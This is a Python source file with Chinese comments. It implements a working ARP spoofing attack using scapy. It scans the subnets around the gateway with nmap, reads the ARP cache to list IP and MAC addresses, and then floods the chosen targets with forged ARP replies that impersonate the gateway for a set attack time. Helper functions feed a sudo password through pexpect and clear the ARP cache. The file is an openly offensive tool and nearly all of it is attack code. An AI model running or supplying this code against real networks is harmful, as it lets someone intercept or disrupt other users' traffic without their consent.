import os
import time
import signal
import asyncio
import subprocess
from threading import Thread


import netifaces
import pexpect
from scapy.all import getmacbyip
from scapy.all import sendp
from scapy.all import send
from scapy.all import Ether
from scapy.all import ARP


def get_routing_nicname():
    '''获取当前网卡名称'''

    return netifaces.gateways(
    )['default'][netifaces.AF_INET][1]  # 获取当前网卡名称


def get_cur_ip():
    '''获取本机ip'''

    routing_nicname = netifaces.gateways(
    )['default'][netifaces.AF_INET][1]  # 获取当前网卡名称
    cur_ip = netifaces.ifaddresses(routing_nicname)[
        netifaces.AF_INET][0]['addr']  # 获取当前ip
    return cur_ip


def get_gateway_ip():
    '''获取当前网关ip'''

    return netifaces.gateways(
    )['default'][netifaces.AF_INET][0]  # 获取当前网关ip


def cach_ip(cmd, delay_time):
    '''扫描ip，使其缓存至arp缓存表
        :param cmd: 要执行的命令
        :param delay_time: nmap扫描时长
    '''
    p = subprocess.Popen(cmd, shell=True)
    for i in range(int(delay_time), 0, -1):
        print("剩余%d(s)" % i)
        time.sleep(1)
    p.kill()


def get_ip_mac_dict():
    '''获取当前网关下所有ip与mac'''

    start_time = time.time()
    gtw_ip_list = get_gateway_ip().split('.')

    nmap_ips = []
    start_ip = int(gtw_ip_list[2]) - 1

    for i in range(start_ip, start_ip + 3):
        nmap_ips.append(gtw_ip_list[0] + '.' + gtw_ip_list[1] +
                        '.' + str(i) + '.0/24')

    nmap_threads = []
    print("正在扫描ip......")
    for nmap_ip in nmap_ips:
        nmap_cmd = "nmap %s" % nmap_ip
        print(nmap_cmd)
        nmap_threads.append(
            Thread(target=cach_ip, args=(nmap_cmd, 3)))

    for thread in nmap_threads:
        thread.start()

    for thread in nmap_threads:
        thread.join()

    print("正在等待扫描结果.....")

    print('***********************************************************')
    p = os.popen("arp -a")  # 获取arp缓存表
    raw_info_list = p.read().split('\n')
    filter_list = [item.split()
                   for item in raw_info_list if "incomplete" not in item and len(item)]
    ip_mac_dict = []
    # for item in filter_list:
    #     print(item)
    for item in filter_list:
        ip_mac_dict.append(
            {"ip": item[1].strip('(').strip(')'), "mac": item[3]})
    return ip_mac_dict


async def attacker(arp, attack_time):
    ''' 开始攻击
    :param ether: ARPSpoofer.arpspoof方法传递
    :param attack_time: ARPSpoofer.arpspoof方法传递
    '''
    start_time = time.time()
    await asyncio.sleep(0.01)
    try:
        while time.time() - start_time < attack_time:
            print("sending......")
            send(arp)
    except Exception as e:
        print(e)
    # exit()


async def attacker_runner(tasks):
    '''attacker携程启动入口'''
    await asyncio.gather(*tasks)


def arpspoof(gateway_ip, self_ip, attack_time, target_ip):
    ''' ARP欺骗攻击
    :param gateway_ip: 要伪装成的ip
    :param self_ip: 本机ip
    :param attack_time: 攻击时长
    :param target_ip: 要攻击的ip

    '''

    assert type(attack_time) == int, \
        '''the type of attack_time must by int'''

    attacker_task = []
    for ip in target_ip:
        print("target ip ", ip)
        self_mac = getmacbyip(self_ip)
        tgt_mac = getmacbyip(ip)
        # print("self_mac: ", self_mac)
        # ether = Ether(src=self_mac, dst=tgt_mac)
        arp = ARP(hwsrc=self_mac, hwdst=tgt_mac,
                  psrc=gateway_ip, pdst=ip, op=2)

        attacker_task.append(attacker(arp, attack_time))

    asyncio.run(attacker_runner(attacker_task))
    return


def check_local_password(password):
    child = pexpect.spawn("sudo arp -a")
    ret = child.expect(['Password:', ''])
    if ret == 0:
        print("ret == 0")
        child.sendline(str(password))
        check_result = child.expect(['Sorry, try again.'])
        if check_result == 0:
            return False
        return True
    elif ret == 1:
        print("ret == 1")
        return True
    else:
        print("something wrong")
        return False


def clear_arp_list(password):
    routing_nicname = get_routing_nicname()
    del_str = "sudo arp -d -i %s -a" % routing_nicname
    child = pexpect.spawn(del_str)
    ret = child.expect(["Password:"])
    if ret == 0:
        child.send(password)
    # os.system(del_str)


# if __name__ == "__main__":
    # get_ip_list()
